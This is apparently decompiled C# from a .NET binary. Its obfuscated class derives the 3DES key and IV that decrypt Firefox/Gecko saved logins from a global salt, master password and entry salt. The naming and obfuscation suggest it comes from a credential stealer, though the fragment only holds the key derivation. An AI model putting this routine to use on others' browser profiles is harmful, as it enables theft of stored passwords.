using System;
using System.Security.Cryptography;

namespace Mist
{
	// Token: 0x02000037 RID: 55
	public class Gecko8
	{
		// Token: 0x17000028 RID: 40
		// (get) Token: 0x0600010F RID: 271 RVA: 0x000049E2 File Offset: 0x00002BE2
		private byte[] _globalSalt { get; }

		// Token: 0x17000029 RID: 41
		// (get) Token: 0x06000110 RID: 272 RVA: 0x000049EA File Offset: 0x00002BEA
		private byte[] _masterPassword { get; }

		// Token: 0x1700002A RID: 42
		// (get) Token: 0x06000111 RID: 273 RVA: 0x000049F2 File Offset: 0x00002BF2
		private byte[] _entrySalt { get; }

		// Token: 0x1700002B RID: 43
		// (get) Token: 0x06000112 RID: 274 RVA: 0x000049FA File Offset: 0x00002BFA
		// (set) Token: 0x06000113 RID: 275 RVA: 0x00004A02 File Offset: 0x00002C02
		public byte[] DataKey { get; private set; }

		// Token: 0x1700002C RID: 44
		// (get) Token: 0x06000114 RID: 276 RVA: 0x00004A0B File Offset: 0x00002C0B
		// (set) Token: 0x06000115 RID: 277 RVA: 0x00004A13 File Offset: 0x00002C13
		public byte[] DataIV { get; private set; }

		// Token: 0x06000116 RID: 278 RVA: 0x00004A1C File Offset: 0x00002C1C
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			this._globalSalt = salt;
			this._masterPassword = password;
			this._entrySalt = entry;
		}

		// Token: 0x06000117 RID: 279 RVA: 0x0000BFC4 File Offset: 0x0000A1C4
		public void го7па()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this._globalSalt.Length + this._masterPassword.Length];
			Array.Copy(this._globalSalt, 0, array, 0, this._globalSalt.Length);
			Array.Copy(this._masterPassword, 0, array, this._globalSalt.Length, this._masterPassword.Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this._entrySalt.Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this._entrySalt, 0, array3, array2.Length, this._entrySalt.Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this._entrySalt, 0, array4, 0, this._entrySalt.Length);
			for (int i = this._entrySalt.Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this._entrySalt.Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this._entrySalt, 0, array5, array4.Length, this._entrySalt.Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this._entrySalt.Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this._entrySalt, 0, array8, array7.Length, this._entrySalt.Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}
	}
}
